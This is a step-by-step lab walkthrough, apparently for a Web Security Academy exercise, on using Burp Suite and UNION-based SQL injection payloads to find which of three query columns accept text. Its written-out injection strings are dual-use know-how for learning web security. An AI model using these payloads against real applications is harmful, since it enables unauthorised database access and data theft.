## Objective

After determining that the original query returns **3 columns**, identify **which of those columns accept text (string) values**.

---

# Step 1: Intercept the Request

1. Open **Burp Suite**.
2. Turn **Intercept ON**.
3. Select any product category on the vulnerable application.
4. Burp captures a request similar to:

```
GET /filter?category=Pets HTTP/2
Host: lab-id.web-security-academy.net
```

Send the request to **Repeater** (`Ctrl + R`).

---

# Step 2: Verify the Number of Columns

From the previous exercise, you know the original query returns **3 columns**.

Verify this using:

```sql
'+UNION+SELECT+NULL,NULL,NULL--
```

### SQL Explanation

```sql
UNION
SELECT
NULL,
NULL,
NULL
```

- `UNION` combines your injected query with the original query.
- Three `NULL` values are used because the original query returns **3 columns**.
- `NULL` is used as a placeholder since it is compatible with most data types.

If the page loads without an SQL error, you've confirmed that the query returns **three columns**.

---

# Step 3: Test the First Column

Replace the first `NULL` with the random string supplied by the lab (for example, `abcdef`):

```sql
'+UNION+SELECT+'abcdef',NULL,NULL--
```

Equivalent SQL:

```sql
UNION
SELECT
'abcdef',
NULL,
NULL
```

### Possible Outcomes

**If the page displays successfully:**

- Column **1** accepts text values.

**If an SQL error occurs:**

- Column **1** does not support text data.
- Move on to the next column.

---

# Step 4: Test the Second Column

```sql
'+UNION+SELECT+NULL,'abcdef',NULL--
```

Equivalent SQL:

```sql
UNION
SELECT
NULL,
'abcdef',
NULL
```

If successful:

- Column **2** supports text.

Otherwise:

- Continue testing.

---

# Step 5: Test the Third Column

```sql
'+UNION+SELECT+NULL,NULL,'abcdef'--
```

Equivalent SQL:

```sql
UNION
SELECT
NULL,
NULL,
'abcdef'
```

If this succeeds:

- Column **3** accepts text values.

---

# Why Do Errors Occur?

Suppose the original query returns:

```sql
SELECT
id,
price,
quantity
```

Imagine the data types are:

| Column | Data Type |
| --- | --- |
| 1 | Integer |
| 2 | Integer |
| 3 | Integer |

If you inject:

```sql
SELECT
'abcdef',
NULL,
NULL
```

Oracle tries to place a **string** into an **integer** column, causing a data type mismatch error.

---

Now imagine the original query is:

| Column | Data Type |
| --- | --- |
| 1 | Integer |
| 2 | VARCHAR |
| 3 | Integer |

Testing:

```sql
SELECT
NULL,
'abcdef',
NULL
```

works because the second column is designed to store text.
